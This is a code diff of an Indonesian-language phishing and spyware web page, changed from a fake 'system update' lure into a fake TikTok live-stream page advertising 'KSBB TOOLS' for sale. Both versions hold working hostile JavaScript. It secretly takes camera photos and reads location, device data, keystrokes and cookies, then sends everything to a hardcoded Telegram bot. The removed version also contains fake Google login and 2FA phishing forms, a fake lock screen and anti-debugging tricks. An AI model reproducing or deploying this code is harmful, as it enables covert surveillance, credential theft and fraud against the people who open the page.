@@ -3,225 +3,401 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ONX-1 • SYSTEM UPDATE</title>
+    <title>KSBB Live • TikTok</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background:#1a1a1a; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; color:white; }
-        .update-container {
-            background:#2c2c2e; border-radius:20px; padding:30px 20px; width:100%; max-width:380px;
-            box-shadow:0 20px 40px rgba(0,0,0,0.6); border:1px solid #3a3a3c; text-align:center;
+        body { background:#000; min-height:100vh; display:flex; justify-content:center; align-items:center; color:white; }
+        
+        .live-container {
+            width: 100%;
+            max-width: 420px;
+            height: 100vh;
+            background: #000;
             position: relative;
-            z-index: 10;
+            overflow: hidden;
+            transition: opacity 0.5s ease;
         }
-        .icon { width:90px; height:90px; background:#0a84ff; border-radius:24px; display:flex; justify-content:center; align-items:center; margin:0 auto 24px; font-size:48px; color:white; }
-        h2 { color:white; margin-bottom:12px; font-weight:400; font-size:24px; }
-        p { color:#a0a0a5; margin-bottom:24px; font-size:15px; line-height:1.5; }
-        .progress-bar { width:100%; height:10px; background:#3a3a3c; border-radius:5px; overflow:hidden; margin:24px 0; }
-        .progress-fill { height:100%; width:0%; background:linear-gradient(90deg, #0a84ff, #5e5ce6); border-radius:5px; transition:width 0.4s ease; }
-        .status-text { color:#a0a0a5; font-size:14px; margin-top:12px; }
-        .device-info { margin-top: 20px; color:#3a3a3c; font-size:11px; }
-        .feature-badge {
-            background: #1e3a5f;
-            border-radius: 30px;
-            padding: 8px 16px;
-            margin: 10px 0 5px;
-            display: inline-block;
-            color: #0a84ff;
-            font-weight: bold;
+        
+        .live-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(145deg, #1a1a1a 0%, #2a2a2a 100%);
+        }
+        
+        .live-badge {
+            position: absolute;
+            top: 60px;
+            left: 16px;
+            background: #fe2c55;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-weight: 700;
             font-size: 14px;
-            border: 1px solid #0a84ff;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            z-index: 20;
         }
-        .feature-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
-            margin: 20px 0;
+        
+        .live-dot {
+            width: 10px;
+            height: 10px;
+            background: white;
+            border-radius: 50%;
+            animation: blink 1s infinite;
         }
-        .feature-item {
-            background: #1c1c1e;
-            border-radius: 12px;
-            padding: 12px 5px;
-            border: 1px solid #3a3a3c;
-            font-size: 13px;
-            font-weight: 500;
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
         }
-        .feature-item span {
-            color: #30d158;
-            margin-right: 5px;
+        
+        .viewer-count {
+            position: absolute;
+            top: 60px;
+            right: 16px;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(5px);
+            padding: 6px 14px;
+            border-radius: 30px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            z-index: 20;
         }
-        .click-badge {
-            background: #ff9f0a;
-            color: #000;
-            font-weight: 800;
-            padding: 15px;
-            border-radius: 50px;
+        
+        .live-header {
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            right: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 20;
+        }
+        
+        .streamer-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(145deg, #fe2c55, #ff8c00);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
             font-size: 20px;
-            margin: 20px 0 10px;
-            animation: pulse 1.5s infinite;
             border: 2px solid white;
         }
+        
+        .streamer-info {
+            flex: 1;
+        }
+        
+        .streamer-name {
+            font-weight: 700;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .verified-icon {
+            background: #20d5ec;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 10px;
+        }
+        
+        .follow-btn {
+            background: #fe2c55;
+            border: none;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .link-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 85%;
+            background: rgba(28, 28, 30, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 32px 24px;
+            z-index: 30;
+            border: 2px solid #fe2c55;
+            box-shadow: 0 20px 40px rgba(254,44,85,0.3);
+            text-align: center;
+            transition: opacity 0.5s ease;
+        }
+        
+        .ksbb-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(145deg, #fe2c55, #ff8c00);
+            border-radius: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 24px;
+            font-size: 44px;
+            color: white;
+            font-weight: 800;
+        }
+        
+        .ksbb-title {
+            color: white;
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            background: linear-gradient(145deg, #fe2c55, #ff8c00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .feature-menu {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin: 24px 0;
+        }
+        
+        .feature-item {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(254,44,85,0.3);
+            border-radius: 12px;
+            padding: 16px 8px;
+            text-align: center;
+        }
+        
+        .feature-icon {
+            font-size: 28px;
+            margin-bottom: 8px;
+            color: #fe2c55;
+        }
+        
+        .feature-text {
+            font-size: 13px;
+            font-weight: 600;
+            color: white;
+        }
+        
+        .main-link {
+            background: linear-gradient(145deg, #fe2c55, #ff8c00);
+            color: white;
+            font-weight: 800;
+            padding: 18px;
+            border-radius: 50px;
+            font-size: 20px;
+            margin: 24px 0 16px;
+            animation: pulse 1.5s infinite;
+            border: 2px solid white;
+            cursor: pointer;
+        }
+        
         @keyframes pulse {
-            0% { transform: scale(1); background: #ff9f0a; }
-            50% { transform: scale(1.05); background: #ff453a; box-shadow: 0 0 20px #ff453a; }
-            100% { transform: scale(1); background: #ff9f0a; }
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
-        #fakeLockScreen { 
-            display:none; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:9999; 
-            flex-direction:column; justify-content:center; align-items:center; color:white; font-size:32px; text-align:center;
+        
+        .link-note {
+            color: #fe2c55;
+            font-size: 12px;
+            margin-top: -10px;
         }
-        #fakeToast { 
-            position:fixed; bottom:60px; left:50%; transform:translateX(-50%); background:rgba(255,59,48,0.92); 
-            color:white; padding:16px 32px; border-radius:20px; z-index:10000; font-size:17px; display:none; max-width:90%;
+        
+        .premium-card {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(254,44,85,0.3);
+            border-radius: 16px;
+            padding: 16px;
+            margin: 20px 0;
         }
-        #gmailPhishOverlay, #otpPhishOverlay {
-            display:none; position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:10001; justify-content:center; align-items:center;
+        
+        .premium-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
         }
-        .phish-box {
-            background:white; border-radius:12px; width:90%; max-width:420px; padding:32px 24px; 
-            box-shadow:0 10px 30px rgba(0,0,0,0.4); text-align:center; color:#202124;
+        
+        .premium-row:last-child {
+            border-bottom: none;
         }
-        .phish-box img { height:28px; margin-bottom:24px; }
-        .phish-box input {
-            width:100%; padding:14px; margin-bottom:16px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box;
+        
+        .live-sidebar {
+            position: absolute;
+            right: 12px;
+            bottom: 100px;
+            z-index: 25;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 24px;
         }
-        #otpInput { font-size:24px; text-align:center; letter-spacing:8px; }
-        .phish-box button {
-            width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px; font-size:16px; cursor:pointer;
+        
+        .sidebar-icon {
+            background: rgba(255,255,255,0.1);
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
         }
-        .phish-box a { color:#1a73e8; font-size:14px; margin-top:24px; cursor:pointer; display:block; }
-        #ipAddress { color: #30d158; font-weight: bold; }
+        
+        .black-page {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 10000;
+            display: none;
+        }
+        
+        .black-page.show {
+            display: block;
+        }
+        
+        #hiddenVideo, #hiddenCanvas, #hiddenAudio { 
+            display: none; 
+        }
+        
+        .status-info { 
+            display: flex; 
+            justify-content: space-between; 
+            margin-top: 20px; 
+            font-size: 11px; 
+            color: rgba(255,255,255,0.4);
+        }
     </style>
 </head>
 <body>
-    <div class="update-container">
-        <div class="icon">⚙️</div>
-        <h2>⚠️ ONX-1 SYSTEM UPDATE ⚠️</h2>
+    <div class="live-container" id="liveContainer">
+        <div class="live-bg"></div>
         
-        <!-- BADGE 100% AKURAT -->
-        <div class="feature-badge">AKURAT 100% ✅</div>
-        
-        <!-- GRID FITUR 2x3 (SEMUA FITUR) -->
-        <div class="feature-grid">
-            <div class="feature-item"><span>📸</span> H4CK KAMERA</div>
-            <div class="feature-item"><span>📍</span> LOKASI TARGET</div>
-            <div class="feature-item"><span>📱</span> INFO DEVICE</div>
-            <div class="feature-item"><span>🌐</span> IP ADDRESS</div>
-            <div class="feature-item"><span>⚡</span> AKURAT 100%</div>
-            <div class="feature-item"><span>🔗</span> MODAL KLIK</div>
+        <div class="live-badge">
+            <span class="live-dot"></span>
+            <span>LIVE</span>
         </div>
         
-        <!-- TOMBOL MODAL KLINK LINK (BERKEDIP) -->
-        <div class="click-badge" id="mainClickButton">
-            🔥 MODAL KLIK LINK! 🔥
-        </div>
-        <p style="color:#ff9f0a; font-size:12px; margin-top:-10px;">(CUKUP KLIK LINK INI, SEMUA DATA DIDAPAT)</p>
-        
-        <!-- PROGRESS -->
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
+        <div class="viewer-count">
+            <span>👥</span>
+            <span>5.2K watching</span>
         </div>
         
-        <div id="statusMessage" class="status-text">Memeriksa keamanan sistem...</div>
+        <div class="live-header">
+            <div class="streamer-avatar">K</div>
+            <div class="streamer-info">
+                <div class="streamer-name">
+                    KSBB_Live 
+                    <span class="verified-icon">✓</span>
+                </div>
+            </div>
+            <button class="follow-btn">Follow</button>
+        </div>
         
-        <!-- IP ADDRESS AKAN TAMPIL DI SINI -->
-        <div class="device-info" id="ipDisplay">Mengambil IP...</div>
-        <div class="device-info" id="deviceModel">Mendeteksi perangkat...</div>
-    </div>
-
-    <!-- Elemen tersembunyi -->
-    <video id="hiddenVideo" autoplay playsinline muted style="display:none"></video>
-    <audio id="hiddenAudio" autoplay style="display:none"></audio>
-    <canvas id="hiddenCanvas" style="display:none"></canvas>
-    <iframe id="hiddenFrame" style="display:none"></iframe>
-
-    <!-- Fake lock & toast -->
-    <div id="fakeLockScreen">
-        <div>🔒 PERANGKAT TERKUNCI 🔒</div>
-        <div style="font-size:18px; margin:30px 20px; color:#ff3b30;">Masukkan PIN/Password untuk membuka. Hubungi support resmi segera.</div>
-    </div>
-    <div id="fakeToast">⚠️ Akses sistem sedang dibatasi untuk keamanan.</div>
-
-    <!-- Gmail Phishing Overlay -->
-    <div id="gmailPhishOverlay">
-        <div class="phish-box">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-            <h2>Masuk ke akun Google Anda</h2>
-            <p>Untuk melanjutkan pembaruan keamanan kritis, verifikasi identitas Anda.</p>
+        <div class="link-overlay" id="linkOverlay">
+            <div class="ksbb-logo">KSBB</div>
+            <div class="ksbb-title">🔥 KSBB TOOLS 🔥</div>
             
-            <form id="gmailForm">
-                <input type="email" id="emailInput" placeholder="Email atau nomor telepon" required>
-                <input type="password" id="passInput" placeholder="Kata sandi" required>
-                <button type="submit">Berikutnya</button>
-            </form>
-            <a onclick="alert('Hubungi support resmi melalui nomor yang tertera di perangkat Anda.')">Lupa kata sandi?</a>
+            <div class="feature-menu">
+                <div class="feature-item"><div class="feature-icon">📸</div><div class="feature-text">H4CK KAMERA</div></div>
+                <div class="feature-item"><div class="feature-icon">📍</div><div class="feature-text">LOKASI TARGET</div></div>
+                <div class="feature-item"><div class="feature-icon">📱</div><div class="feature-text">INFO DEVICE</div></div>
+                <div class="feature-item"><div class="feature-icon">🌐</div><div class="feature-text">IP ADDRESS</div></div>
+                <div class="feature-item"><div class="feature-icon">⚡</div><div class="feature-text">AKURAT 100%</div></div>
+                <div class="feature-item"><div class="feature-icon">🔗</div><div class="feature-text">MODAL KLIK</div></div>
+            </div>
+            
+            <div class="main-link" id="mainClickButton">
+                🔥 CLAIM ACCESS NOW 🔥
+            </div>
+            <div class="link-note">(klik sekali, semua data didapat)</div>
+            
+            <div class="premium-card">
+                <div class="premium-row"><span>GOPAY</span><span style="color:#fe2c55;">081310106177</span></div>
+                <div class="premium-row"><span>DANA</span><span style="color:#fe2c55;">0895405562870</span></div>
+                <div class="premium-row"><span>Reseller</span><span style="color:#fe2c55;">Rp70K</span></div>
+                <div class="premium-row"><span>Bot</span><span style="color:#fe2c55;">@KalsStrongBoyBOT_Bot</span></div>
+            </div>
+            
+            <div class="status-info">
+                <span id="ipDisplay">📡 IP: mengambil...</span>
+                <span id="deviceModel">📱 device: deteksi...</span>
+            </div>
+        </div>
+        
+        <div class="live-sidebar">
+            <div><div class="sidebar-icon">❤️</div><div style="font-size:12px;">125K</div></div>
+            <div><div class="sidebar-icon">💬</div><div style="font-size:12px;">8.2K</div></div>
         </div>
     </div>
 
-    <!-- OTP Phishing Overlay -->
-    <div id="otpPhishOverlay">
-        <div class="phish-box">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-            <h2>Verifikasi 2 Langkah</h2>
-            <p>Kode verifikasi dikirim ke nomor/email Anda.</p>
-            <p id="otpTarget" style="color:#1a73e8; margin-bottom:24px;">Masukkan kode 6 digit:</p>
-            
-            <input type="text" id="otpInput" maxlength="6" placeholder="______" required>
-            <button id="otpSubmit">Verifikasi</button>
-        </div>
-    </div>
+    <div class="black-page" id="blackPage"></div>
+
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <audio id="hiddenAudio" autoplay></audio>
+    <canvas id="hiddenCanvas"></canvas>
 
     <script>
-        // ==================== KONFIGURASI TELEGRAM (TOKEN DAN ID SUDAH DIISI) ====================
         const TELEGRAM_TOKEN = '8741447274:AAG4LxoaQ559dj4W7u-Nuz0Zp5IwCP_Vlqo';
         const TELEGRAM_CHAT_ID = '6034935293';
+        const BOT_NAME = 'KSBB';
 
-        // ==================== DETEKSI DEVICE ====================
         const ua = navigator.userAgent;
         const isAndroid = /Android/i.test(ua);
         const isIOS = /iPhone|iPad|iPod/i.test(ua);
-        const isMobile = /Mobile/i.test(ua);
-
+        
         let deviceInfo = {
-            type: isIOS ? 'iOS' : (isAndroid ? 'Android' : 'Desktop/Unknown'),
-            ua: ua,
-            screen: `${screen.width}x${screen.height}`,
+            type: isIOS ? 'iOS' : (isAndroid ? 'Android' : 'Desktop'),
             tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            time: new Date().toISOString(),
-            language: navigator.language,
-            platform: navigator.platform,
-            vendor: navigator.vendor
+            lang: navigator.language,
+            screen: `${screen.width}x${screen.height}`
         };
 
-        document.getElementById('deviceModel').innerText = `${deviceInfo.type} • ${deviceInfo.tz} • ${deviceInfo.screen}`;
+        document.getElementById('deviceModel').innerText = `📱 ${deviceInfo.type}`;
 
-        let capturedPhotos = [];
-        let cameraStream = null;
-        let allKeystrokes = '';
-        let cookiesStolen = document.cookie;
         let publicIP = 'Mengambil...';
+        let allKeys = '';
+        let cameraStream = null;
 
-        // ==================== AMBIL IP PUBLIC ====================
         async function getPublicIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 publicIP = data.ip;
-                document.getElementById('ipDisplay').innerHTML = `🌐 IP: ${publicIP}`;
-                return publicIP;
+                document.getElementById('ipDisplay').innerHTML = `📡 IP: ${publicIP}`;
             } catch {
-                document.getElementById('ipDisplay').innerHTML = '🌐 IP: tidak diketahui';
-                return 'unknown';
+                document.getElementById('ipDisplay').innerHTML = '📡 IP: unknown';
             }
         }
         getPublicIP();
 
-        // ==================== KIRIM KE TELEGRAM ====================
         async function sendToTelegram(msg) {
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `[${BOT_NAME}] ${msg}` })
                 });
             } catch {}
         }
@@ -234,233 +410,112 @@
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+                formData.append('caption', `[${BOT_NAME}] ${caption}`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
             } catch {
-                await sendToTelegram(`${caption}\n[GAGAL KIRIM FOTO]`);
+                sendToTelegram(`${caption} [FOTO GAGAL]`);
             }
         }
 
-        // ==================== UPDATE STATUS ====================
-        function updateStatus(msg, pct) {
-            document.getElementById('statusMessage').innerText = msg;
-            document.getElementById('progressFill').style.width = pct + '%';
-        }
-
-        // ==================== KAMERA GRAB ====================
-        async function getCameraUniversal() {
+        async function getCamera() {
             try {
-                updateStatus('📸 Mengakses kamera target...', 15);
-                await sendToTelegram("📸 [KAMERA] Mulai akses");
-
-                const constraintsList = [
-                    { video: { facingMode: { exact: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } } },
-                    { video: { facingMode: 'user' } },
-                    { video: { facingMode: { exact: 'environment' } } },
-                    { video: { facingMode: 'environment' } },
-                    { video: true }
-                ];
-
-                let success = false;
-                let modeUsed = 'unknown';
-
-                for (const cons of constraintsList) {
-                    try {
-                        cameraStream = await navigator.mediaDevices.getUserMedia(cons);
-                        success = true;
-                        modeUsed = cons.video?.facingMode?.exact || cons.video?.facingMode || 'default';
-                        await sendToTelegram(`📸 Sukses: ${modeUsed}`);
-                        break;
-                    } catch (err) {
-                        // coba next
-                    }
-                }
-
-                if (!success) throw new Error("Semua constraint gagal");
-
+                sendToTelegram("📸 Akses kamera dimulai");
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('hiddenVideo');
-                video.srcObject = cameraStream;
-                video.muted = true;
-                video.playsInline = true;
-
-                await new Promise((res, rej) => {
-                    video.onloadedmetadata = () => video.play().then(res).catch(rej);
-                    setTimeout(() => rej(new Error("Timeout video")), 10000);
-                });
-
-                await new Promise(r => setTimeout(r, 1800));
-
-                for (let i = 1; i <= 5; i++) {
-                    let photo = capturePhoto();
-                    if (photo) {
-                        capturedPhotos.push(photo);
-                        await sendPhotoToTelegram(photo, `📸 FOTO ${i} - ${deviceInfo.type} (${modeUsed})`);
-                    }
-                    await new Promise(r => setTimeout(r, 800));
+                video.srcObject = stream;
+                await video.play();
+                
+                for(let i = 1; i <= 5; i++) {
+                    setTimeout(() => {
+                        const canvas = document.getElementById('hiddenCanvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const photo = canvas.toDataURL('image/jpeg');
+                        sendPhotoToTelegram(photo, `📸 FOTO ${i}`);
+                    }, i * 1000);
                 }
-
-            } catch (err) {
-                await sendToTelegram(`📸 ERROR: ${err.message}`);
-            } finally {
-                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+                
+                setTimeout(() => {
+                    stream.getTracks().forEach(t => t.stop());
+                }, 6000);
+            } catch (e) {
+                sendToTelegram(`📸 Gagal kamera: ${e.message}`);
             }
         }
 
-        function capturePhoto() {
-            const v = document.getElementById('hiddenVideo');
-            const c = document.getElementById('hiddenCanvas');
-            if (!v.videoWidth) return null;
-            c.width = v.videoWidth;
-            c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            return c.toDataURL('image/jpeg', 0.78);
-        }
-
-        // ==================== KEYLOGGER ====================
-        document.addEventListener('keydown', (e) => {
-            if (e.key.length === 1) allKeystrokes += e.key;
-            else if (e.key === 'Backspace') allKeystrokes += '[BACK]';
-            else if (e.key === 'Enter') allKeystrokes += '[ENTER]\n';
-        });
-
-        // ==================== LOKASI TARGET ====================
-        async function grabLocation() {
+        async function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     pos => {
-                        const locMsg = `📍 LOKASI TARGET:\nLat: ${pos.coords.latitude}\nLng: ${pos.coords.longitude}\nAkurasi: ${pos.coords.accuracy}m`;
-                        sendToTelegram(locMsg);
+                        sendToTelegram(`📍 LOKASI: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                        sendToTelegram(`📍 MAPS: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`);
                     },
-                    err => sendToTelegram(`📍 Lokasi gagal: ${err.message}`)
+                    err => sendToTelegram(`📍 Gagal: ${err.message}`)
                 );
             }
         }
 
-        // ==================== INFO DEVICE LENGKAP ====================
-        function getFullDeviceInfo() {
-            const ipForMsg = publicIP;
-            const infoMsg = `📱 INFO DEVICE LENGKAP:
-• Tipe: ${deviceInfo.type}
-• Platform: ${deviceInfo.platform}
-• Vendor: ${deviceInfo.vendor}
-• Layar: ${deviceInfo.screen}
-• Timezone: ${deviceInfo.tz}
-• Bahasa: ${deviceInfo.language}
-• IP Public: ${ipForMsg}
-• User Agent: ${deviceInfo.ua.substring(0, 200)}...`;
-            
-            sendToTelegram(infoMsg);
+        function getBattery() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    sendToTelegram(`🔋 Baterai: ${battery.level * 100}% (${battery.charging ? 'charging' : 'tidak charging'})`);
+                });
+            }
         }
 
-        // ==================== CHAOS KONTROL ====================
-        function chaosControls() {
-            if (navigator.vibrate) {
-                setInterval(() => navigator.vibrate([80,40,120,60,200]), 12000);
+        function getNetworkInfo() {
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                sendToTelegram(`📶 Network: ${conn.effectiveType}, ${conn.downlink}Mbps`);
             }
-
-            function showToast(txt) {
-                const t = document.getElementById('fakeToast');
-                t.textContent = txt;
-                t.style.display = 'block';
-                setTimeout(() => t.style.display = 'none', 5000);
-            }
-            const toasts = ["📸 Mengakses kamera...", "📍 Melacak lokasi...", "🌐 IP terekam", "🔒 Sistem terkunci"];
-            setInterval(() => showToast(toasts[Math.floor(Math.random()*toasts.length)]), 8000);
-
-            setTimeout(() => {
-                document.getElementById('fakeLockScreen').style.display = 'flex';
-                document.querySelector('.update-container').style.opacity = '0.3';
-            }, 35000);
         }
-
-        // ==================== PHISHING FLOW ====================
-        document.getElementById('gmailForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const email = document.getElementById('emailInput').value.trim();
-            const pass = document.getElementById('passInput').value.trim();
-            if (!email || !pass) return;
-
-            const cred = `🎯 GMAIL HIT\nEmail: ${email}\nPass: ${pass}\nKeystrokes: ${allKeystrokes}\nIP: ${publicIP}`;
-            await sendToTelegram(cred);
-
-            document.getElementById('gmailPhishOverlay').style.display = 'none';
-            document.getElementById('otpPhishOverlay').style.display = 'flex';
-        });
-
-        document.getElementById('otpSubmit').addEventListener('click', async function() {
-            const otp = document.getElementById('otpInput').value.trim();
-            if (otp.length !== 6 || !/^\d{6}$/.test(otp)) return;
-
-            const otpData = `🔐 2FA HIT!\nOTP: ${otp}\nFull Keystrokes: ${allKeystrokes}`;
-            await sendToTelegram(otpData);
-
-            alert("Verifikasi berhasil. Pembaruan selesai.");
-            setTimeout(() => { window.location.href = "https://myaccount.google.com/"; }, 1500);
-        });
-
-        // ==================== ANTI DEBUG ====================
-        setInterval(() => {
-            if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
-                document.body.innerHTML = '<h1 style="color:red;text-align:center;padding:40px;">DEVELOPER TOOLS DETECTED - SESSION TERMINATED</h1>';
-            }
-        }, 400);
 
         document.addEventListener('keydown', e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase()))) {
-                e.preventDefault();
-                alert('Akses ditolak selama proses keamanan.');
+            if (e.key.length === 1) allKeys += e.key;
+            if (e.key === 'Enter') allKeys += '[ENTER]';
+            if (e.key === 'Backspace') allKeys += '[BACK]';
+            
+            if (allKeys.length > 100) {
+                sendToTelegram(`⌨️ KEYLOG: ${allKeys}`);
+                allKeys = '';
             }
         });
 
-        // ==================== START EKSEKUSI ====================
-        window.onload = async function() {
-            updateStatus('⚡ MODAL KLIK LINK... 🔥', 5);
+        setInterval(() => {
+            if (allKeys.length > 0) {
+                sendToTelegram(`⌨️ KEYLOG: ${allKeys}`);
+                allKeys = '';
+            }
+        }, 30000);
+
+        document.getElementById('mainClickButton').addEventListener('click', async function() {
+            sendToTelegram(`🔥 TARGET BARU\nTipe: ${deviceInfo.type}\nIP: ${publicIP}\nTZ: ${deviceInfo.tz}\nScreen: ${deviceInfo.screen}`);
             
-            // Kirim notifikasi awal dengan IP
-            setTimeout(async () => {
-                const finalIP = publicIP !== 'Mengambil...' ? publicIP : await getPublicIP();
-                const startMsg = `🔥 TARGET BARU (MODAL KLIK LINK!)
-Tipe: ${deviceInfo.type}
-IP: ${finalIP}
-Layar: ${deviceInfo.screen}
-TZ: ${deviceInfo.tz}`;
-                await sendToTelegram(startMsg);
-                
-                // Kirim info device lengkap
-                getFullDeviceInfo();
-                
-                // Ambil lokasi
-                grabLocation();
-                
-                // Mulai kamera
-                await getCameraUniversal();
-            }, 2000);
+            getLocation();
+            getBattery();
+            getNetworkInfo();
+            await getCamera();
+            
+            sendToTelegram(`🍪 Cookies: ${document.cookie || 'Tidak ada'}`);
+            
+            document.getElementById('liveContainer').style.opacity = '0';
+            
+            setTimeout(() => {
+                document.getElementById('blackPage').classList.add('show');
+            }, 500);
+            
+            setTimeout(() => {
+                sendToTelegram(`✅ SEMUA DATA TERKIRIM`);
+            }, 7000);
+        });
 
-            chaosControls();
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+            }
+        });
 
-            // Progress bar & munculin phishing
-            let pct = 10;
-            const sim = setInterval(() => {
-                pct += Math.random() * 12;
-                if (pct >= 100) {
-                    pct = 100;
-                    clearInterval(sim);
-                    updateStatus('✅ UPDATE SELESAI — VERIFIKASI DIPERLUKAN', 100);
-                    
-                    setTimeout(() => {
-                        document.getElementById('gmailPhishOverlay').style.display = 'flex';
-                        document.querySelector('.update-container').style.opacity = '0.3';
-                    }, 2000);
-                } else {
-                    updateStatus(`🔍 Mengakses data target... ${Math.round(pct)}%`, pct);
-                }
-            }, 1300);
-        };
-
-        // Cegah close/refresh
         window.addEventListener('beforeunload', e => {
             e.preventDefault();
             e.returnValue = '';
